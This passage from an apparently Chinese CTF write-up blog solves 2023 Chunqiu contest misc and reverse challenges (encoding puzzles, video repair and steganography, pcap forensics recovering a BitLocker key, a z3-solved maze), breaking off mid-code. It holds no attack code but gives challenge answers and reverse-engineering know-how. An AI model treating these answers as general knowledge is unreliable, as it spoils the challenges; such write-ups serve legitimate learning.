id="58与64">58与64</h3><p>下载附件解压之后，得到很多<code>txt</code>文件，而<code>txt</code>文件中基本上只有一两个字母，根据题目中的<code>58</code>，猜测文件内容为<code>base58</code><br>将文件内容进行<code>base58</code>解密之后连接起来得到<code>base64</code>字符串，进行多次<code>base64</code>解密得到<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params">text,mode=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> mode:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(text)==<span class="hljs-built_in">bytes</span>:<br>            text=text.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(text)==<span class="hljs-built_in">str</span>:<br>            text=text.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">return</span> text<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">b58</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.__base=<span class="hljs-string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">int_to_str</span>(<span class="hljs-params">num</span>):<br>        cache=<span class="hljs-built_in">hex</span>(num)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)<br>        text=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(cache),<span class="hljs-number">2</span>):<br>            text.append(<span class="hljs-built_in">int</span>(cache[i:i+<span class="hljs-number">2</span>],<span class="hljs-number">16</span>))<br>        <span class="hljs-keyword">return</span> text<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self,text</span>):<br>        text=convert(text,<span class="hljs-number">1</span>)<br>        err=<span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">try</span>:<br>            n=<span class="hljs-number">0</span><br>            txt=[]<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> text:<br>                err=i<br>                txt.append(self.__base.index(i))<br>            err=<span class="hljs-string">&#x27;&#x27;</span><br>            cache=<span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(txt)):<br>                cache=cache*<span class="hljs-number">58</span>+txt[i]<br>            detext=b58.int_to_str(cache)<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(detext)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;%s is not found&#x27;</span>%err)<br><br>files=os.listdir(<span class="hljs-string">&#x27;tmp&#x27;</span>)<br>files.sort(key=<span class="hljs-keyword">lambda</span> d:<span class="hljs-built_in">int</span>(d[:-<span class="hljs-number">4</span>]))<br>outdata=<span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> files:<br>    f=<span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&#x27;tmp&#x27;</span>,i))<br>    outdata+=b58().decode(f.read())<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span>(outdata)<br>    outdata=base64.b64decode(outdata)<br></code></pre></td></tr></table></figure><h3 id="盲人隐藏了起来">盲人隐藏了起来</h3><p>解压附件得到三个文件<code>12</code>,<code>34.mp4</code>,<code>flag.zip</code>,使用<code>010</code>打开<code>12</code>,<code>34.mp4</code><br>发现<code>12</code>文件中的内容，与<code>34.mp4</code>中<code>mdat</code>段的内容结构类似，将<code>12</code>中的内容替换为<code>34.mp4</code>中的<code>mdat</code>段之后，打开视频得到压缩包密码<code>ChunJiSai7k7kbibi@!</code><br>解压得到了<code>flag.png</code>，在文件结尾存在字符串<code>keyischunqiu123</code>不过没有发现有什么用，执行<code>zsteg -a flag.png</code>，发现在<code>b1,bgr,lsb,xy</code>中存在<code>flag</code>信息,使用<code>zsteg flag.png -e b1,bgr,lsb,xy |strings | grep flag</code>得到flag</p><h3 id="happy2forensics">happy2forensics</h3><p>在<code>http</code>数据包中，发现有主机使用<code>POST</code>方法像服务器上传了一个<code>secret.rar</code>,导出之后解压得到<code>secret.vhdx</code>,装载之后发现是<code>bitlocker</code>加密的磁盘文件,在数据包中，存在一个主机使用<code>20</code>端口向<code>80</code>端口发送数据，因为<code>20</code>端口一半用于<code>FTP-DATA</code>协议,而且主机只发送<code>syn</code>数据包,不进行<code>tcp</code>连接,查看数据包之后发现<code>tcp.seq_raw</code>字段中可能存在数据<br>使用<code>tshark</code>导出数据<code>tshark -r happy2forensics.pcapng -Y &quot;tcp.srcport==20&quot; -T fields -e tcp.seq_raw</code>,将导出数据转换为字符串之后得到<code>bitlocker:120483-350966-299189-055297-225478-133463-431684-359403</code><br>装载磁盘文件,存在很多图片,同时还存在一个<code>210-1.png</code>无法直接打开,使用<code>010</code>查看之后发现存在多个文件,使用<code>foremost</code>分离文件,同时在磁盘文件中作为回收站的区域中存在一个压缩包,压缩包中存在<code>flag2.txt</code></p><p>下面是<code>jpg</code>文件内容<br><img src="/img/blog_img/2023chunqiuspring/misc-happy2forensics.jpg" srcset="/img/loading.gif" lazyload alt=""></p><p>根据提示合并磁盘文件中的<code>png</code>图片,与<code>210-1.png</code>分离之后得到的<code>png</code>图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">210-1.png</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> PIL<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">import</span> os<br>d=os.listdir(<span class="hljs-string">&#x27;png&#x27;</span>)<br>d.sort(key=<span class="hljs-keyword">lambda</span> n:<span class="hljs-built_in">int</span>(n[:-<span class="hljs-number">4</span>]))<br>i=Image.<span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&#x27;png&#x27;</span>,d[<span class="hljs-number">0</span>]))<br>w,h=i.size<br>im=Image.new(i.mode,(w*<span class="hljs-built_in">len</span>(d),h))<br>i.close()<br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">try</span>:<br>        fp=os.path.join(<span class="hljs-string">&#x27;png&#x27;</span>,v)<br>        im1=Image.<span class="hljs-built_in">open</span>(fp)<br>        im.paste(im1,(i,<span class="hljs-number">0</span>))<br>        i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>im.save(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">磁盘文件</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> PIL<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">import</span> os<br>d=os.listdir(<span class="hljs-string">&#x27;png&#x27;</span>)<br>d.sort(key=<span class="hljs-keyword">lambda</span> n:<span class="hljs-built_in">int</span>(n[:-<span class="hljs-number">4</span>]))<br>i=Image.<span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&#x27;png&#x27;</span>,d[<span class="hljs-number">0</span>]))<br>w,h=i.size<br>im=Image.new(i.mode,(w,h*<span class="hljs-built_in">len</span>(d)))<br>i.close()<br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">try</span>:<br>        fp=os.path.join(<span class="hljs-string">&#x27;png&#x27;</span>,v)<br>        im1=Image.<span class="hljs-built_in">open</span>(fp)<br>        im.paste(im1,(<span class="hljs-number">0</span>,i))<br>        i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>im.save(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>210-1.png</code>合并图片<br><img src="/img/blog_img/2023chunqiuspring/misc-happy2forensics-1.png" srcset="/img/loading.gif" lazyload alt=""><br>解压压缩包得到<code>flag2:-919c-a140d7054ac5</code></p><p><code>磁盘文件</code>合并图片<br><img src="/img/blog_img/2023chunqiuspring/misc-happy2forensics-2.png" srcset="/img/loading.gif" lazyload alt=""><br>看来<code>flag</code>并不在这里</p><p>使用<code>010</code>查看之前分离出来的<code>jpg</code>,发现存在两个<code>jpg</code>头,删除开始的<code>jpg</code>头之后得到一张新的图片<br><img src="/img/blog_img/2023chunqiuspring/misc-happy2forensics-3.jpg" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="REVERSE">REVERSE</h2><h3 id="sum">sum</h3><p>因为输入的数据会写入到一个9x9的二维数组中,同时二维数组的内容为0~9的数字,并且,输入的数据会替换掉二维数组中0所在的位置,所以我猜测是一个数独游戏,将<code>matrix</code>变量的内容导出来,作为一个<code>9x9</code>的方阵<br>将数字导入到这个<a href="https://www.dcode.fr/sudoku-solver">数独</a>网站之后就可以获得数独中需要填入的内容了<br><img src="/img/blog_img/2023chunqiuspring/reverse-sum.png" srcset="/img/loading.gif" lazyload alt=""></p><h3 id="Pytrans">Pytrans</h3><p>先使用<code>pyinstxtractor</code>将<code>exe</code>解包,然后使用<a href="https://tool.lu/pyc">在线pyc反编译网站</a>,将解包之后得到的<code>run.pyc</code>反编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit https://tool.lu/pyc/ for more information</span><br><span class="hljs-comment"># Version: Python 3.9</span><br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-comment"># WARNING: Decompyle incomplete</span><br></code></pre></td></tr></table></figure><p>反编译失败,不过我们可以通过<code>run.pyc</code>中的字符串内容,来推测实际代码<br><img src="/img/blog_img/2023chunqiuspring/reverse-Pytrans.png" srcset="/img/loading.gif" lazyload alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">猜测的run.py代码</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> ctypes<br>dll=CDLL(<span class="hljs-string">&#x27;./mylib.so&#x27;</span>)<br>data=<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please enter the 10 digits and ending with &#x27;\n&#x27;:&quot;</span>).split()])<br>data_p=dll.check(data)<br>data=base64.b64decode(ctypes.c_char_p(data_p).value)<br>data=zlib.decompress(data)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">剩下的不太确定了,不过可以确定的是data的内容后面是要被执行的</span><br><span class="hljs-string">所以我们需要先获取data的值</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/2023chunqiuspring/reverse-Pytrans-1.png" srcset="/img/loading.gif" lazyload alt=""><br>在<code>mylib.so</code>中的<code>check</code>函数的开头存在这段代码,使用python的z3模块解方程得到数据内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> z3<br>s=z3.Solver()<br>a1 =z3.Int(<span class="hljs-string">&quot;a1&quot;</span>)<br>a11=z3.Int(<span class="hljs-string">&quot;a11&quot;</span>)<br>a12=z3.Int(<span class="hljs-string">&quot;a12&quot;</span>)<br>a13=z3.Int(<span class="hljs-string">&quot;a13&quot;</span>)<br>a14=z3.Int(<span class="hljs-string">&quot;a14&quot;</span>)<br>a15=z3.Int(<span class="hljs-string">&quot;a15&quot;</span>)<br>a16=z3.Int(<span class="hljs-string">&quot;a16&quot;</span>)<br>a17=z3.Int(<span class="hljs-string">&quot;a17&quot;</span>)<br>a18=z3.Int(<span class="hljs-string">&quot;a18&quot;</span>)<br>a19=z3.Int(<span class="hljs-string">&quot;a19&quot;</span>)<br><br>a=[]<br>a.append(a1 )<br>a.append(a11)<br>a.append(a12)<br>a.append(a13)<br>a.append(a14)<br>a.append(a15)<br>a.append(a16)<br>a.append(a17)<br>a.append(a18)<br>a.append(a19)<br><br>s.insert(-<span class="hljs-number">27</span> * a17 + -<span class="hljs-number">11</span> * a16 + <span class="hljs-number">16</span> * a15 + a1 + <span class="hljs-number">2</span> * a11 - a12 + <span class="hljs-number">8</span> * a13 - <span class="hljs-number">14</span> * a14 + <span class="hljs-number">26</span> * a18 + <span class="hljs-number">17</span> * a19 == <span class="hljs-number">14462</span> )<br>s.insert(-<span class="hljs-number">30</span> * a18 + <span class="hljs-number">13</span> * a15 + a13 + a11 + <span class="hljs-number">2</span> * a1 - <span class="hljs-number">15</span> * a14 - <span class="hljs-number">24</span> * a16 + <span class="hljs-number">16</span> * a17 + <span class="hljs-number">36</span> * a19 == -<span class="hljs-number">2591</span> )<br>s.insert(<span class="hljs-number">16</span> * a16 + -<span class="hljs-number">21</span> * a15 + <span class="hljs-number">7</span> * a13 + <span class="hljs-number">3</span> * a11 - a1 - a12 + <span class="hljs-number">12</span> * a14 - <span class="hljs-number">23</span> * a17 + <span class="hljs-number">25</span> * a18 - <span class="hljs-number">18</span> * a19 == <span class="hljs-number">2517</span> )<br>s.insert(-<span class="hljs-number">6</span> * a16 + <span class="hljs-number">2</span> * a12 - a11 + <span class="hljs-number">2</span> * a15 + <span class="hljs-number">9</span> * a17 + <span class="hljs-number">2</span> * a18 - <span class="hljs-number">5</span> * a19 == <span class="hljs-number">203</span> )<br>s.insert(-<span class="hljs-number">5</span> * a18 + <span class="hljs-number">6</span> * a17 + <span class="hljs-number">3</span> * a11 - a13 - a15 + a16 + <span class="hljs-number">5</span> * a19 == <span class="hljs-number">3547</span> )<br>s.insert(-<span class="hljs-number">9</span> * a18 + a14 + a12 + a17 - <span class="hljs-number">5</span> * a19 == -<span class="hljs-number">7609</span> )<br>s.insert(<span class="hljs-number">2</span> * a15 + -a13 - a14 + a18 + <span class="hljs-number">6</span> * a19 == <span class="hljs-number">4884</span> )<br>s.insert(a16 - a17 + <span class="hljs-number">2</span> * a18 == <span class="hljs-number">1618</span> )<br>s.insert(a14 - a16 + <span class="hljs-number">2</span> * a19 == <span class="hljs-number">1096</span> )<br>s.insert(a18 + a14 + a13 + a12 + a11 + a1 - a15 - a16 - a17 - a19 == <span class="hljs-number">711</span> )<br>s.insert(<span class="hljs-number">2</span> * (<span class="hljs-number">2</span> * a14 + a13) + <span class="hljs-number">5</span> * a15 == <span class="hljs-number">7151</span> )<br>s.check()<br>res=s.model()<br>e=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e.append(res[i])<br><span class="hljs-built_in">print</span>(e)<br><br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> ctypes<br>dll=ctypes.CDLL(<span class="hljs-string">&quot;./mylib.so&quot;</span>)<br>data=<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(i.as_long()) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e])<br>data_p=dll.check(data)<br>data=base64.b64decode(ctypes.c_char_p(data_p).value)<br>data=zlib.decompress(data)<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(data)<br>f.close()<br></code></pre></td></tr></table></figure><p>使用<code>010</code>查看导出的<code>data</code>文件,发现是<code>pyc</code>文件缺少了头,因为<code>exe</code>解包之后的<code>pyc</code>中大多数都是<code>python3.8</code>版本的<code>pyc</code>文件,所以将<code>3.8</code>版本的<code>pyc</code>头写入<code>data</code>文件之后,进行反编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit https://tool.lu/pyc/ for more information</span><br><span class="hljs-comment"># Version: Python 3.8</span><br><br>footprint = <span class="hljs-string">&#x27;3qzqns4hj6\neeaxc!4a-%\nd735_@4l6g\nf1gd1v7hdm\n1+$-953&#125;81\na^21vbnm3!\n-#*f-e1d8_\n2ty9uipok-\n6r1802f7d1\n9wez1c-f&#123;0&#x27;</span><br>xx0000 = []<br>footprintlist = footprint.split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(footprintlist)):<br>    xx0000.append(<span class="hljs-built_in">list</span>(footprintlist[i]))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xxxx000x0</span>(<span class="hljs-params">num</span>):<br>    xx000000 = <span class="hljs-built_in">format</span>(num, <span class="hljs-string">&#x27;010b&#x27;</span>)<br>    <span class="hljs-keyword">return</span> xx000000<br><br>oxooxxxxxoooo = []<br>xx0000000 = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please enter the previous 10 digits again and ending with &#x27;\\n&#x27;: &quot;</span>).split(<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(xx0000000) == <span class="hljs-number">10</span>:<br>    <br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xx0000000:<br>            oxooxxxxxoooo.append(<span class="hljs-built_in">int</span>(i))<br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;err input!&#x27;</span>)<br>    exit(-<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;err input!&#x27;</span>)<br>    exit(-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(oxooxxxxxoooo)):<br>        oxooxxxxxoooo[i] = <span class="hljs-built_in">list</span>(xxxx000x0(oxooxxxxxoooo[i]))<br>    xx0000x000 = oxooxxxxxoooo<br>    (x, o) = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>    xx00x00x0xxx00 = [<br>        (x, o)]<br>    xx00x00x0xxx00input = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;input maze path:&#x27;</span>))<br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> (x, o) != (<span class="hljs-number">9</span>, <span class="hljs-number">9</span>):<br>        <span class="hljs-keyword">if</span> count &lt; <span class="hljs-built_in">len</span>(xx00x00x0xxx00input):<br>            xx0000x0xxx00 = xx00x00x0xxx00input[count]<br>            <span class="hljs-keyword">if</span> xx0000x0xxx00 == <span class="hljs-string">&#x27;a&#x27;</span>:<br>                <span class="hljs-keyword">if</span> o &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> xx0000x000[x][o - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;0&#x27;</span>:<br>                    o -= <span class="hljs-number">1</span><br>                    count += <span class="hljs-number">1</span><br>                    xx00x00x0xxx00.append((x, o))<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrong!&#x27;</span>)<br>                    exit(-<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">elif</span> xx0000x0xxx00 == <span class="hljs-string">&#x27;d&#x27;</span>:<br>                <span class="hljs-keyword">if</span> o &lt; <span class="hljs-number">9</span> <span class="hljs-keyword">and</span> xx0000x000[x][o + <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;0&#x27;</span>:<br>                    count += <span class="hljs-number">1</span><br>                    o += <span class="hljs-number">1</span><br>                    xx00x00x0xxx00.append((x, o))<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrong!&#x27;</span>)<br>                    exit(-<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">elif</span> xx0000x0xxx00 == <span class="hljs-string">&#x27;w&#x27;</span>:<br>                <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> xx0000x000[x - <span class="hljs-number">1</span>][o] == <span class="hljs-string">&#x27;0&#x27;</span>:<br>                    count += <span class="hljs-number">1</span><br>                    x -= <span class="hljs-number">1</span><br>                    xx00x00x0xxx00.append((x, o))<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrong!&#x27;</span>)<br>                    exit(-<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">elif</span> xx0000x0xxx00 == <span class="hljs-string">&#x27;s&#x27;</span>:<br>                <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">9</span> <span class="hljs-keyword">and</span> xx0000x000[x + <span class="hljs-number">1</span>][o] == <span class="hljs-string">&#x27;0&#x27;</span>:<br>                    count += <span class="hljs-number">1</span><br>                    x += <span class="hljs-number">1</span><br>                    xx00x00x0xxx00.append((x, o))<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrong!&#x27;</span>)<br>                    exit(-<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrong!&#x27;</span>)<br>                exit(-<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrong!&#x27;</span>)<br>        exit(-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">continue</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;right! you maybe got it,flag is flag&#123;the footprint of the maze path&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>发现将上面脚本中得到的e中的整数,转换为十位二进制之后可以得到一个迷宫,通过解迷宫之后输入可以得到flag<br>迷宫路径为<code>sddsdssdddwwwddsssssaaaaassddsddwdds</code></p><h3 id="Emoji-Connect">Emoji Connect</h3><p>执行解压之后得到的<code>.vsto</code>文件会在<code>excel</code>中安装<code>com程序</code>,之后创建一个新的表格,在<code>excel</code>的菜单栏中会出现一个<code>春秋GAME</code>,点击之后可以开启一个连连看游戏,这个<code>vsto</code>文件实际上是将<code>Emoji_Connect.dll</code>安装到<code>excel</code>中,不过我第一次安装成功了,但删除之后再安装菜单栏中就没有<code>春秋GAME</code>了<br><code>Emoji_Connect.dll</code>是一个<code>.net</code>程序,使用<code>dnspy</code>分析程序</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 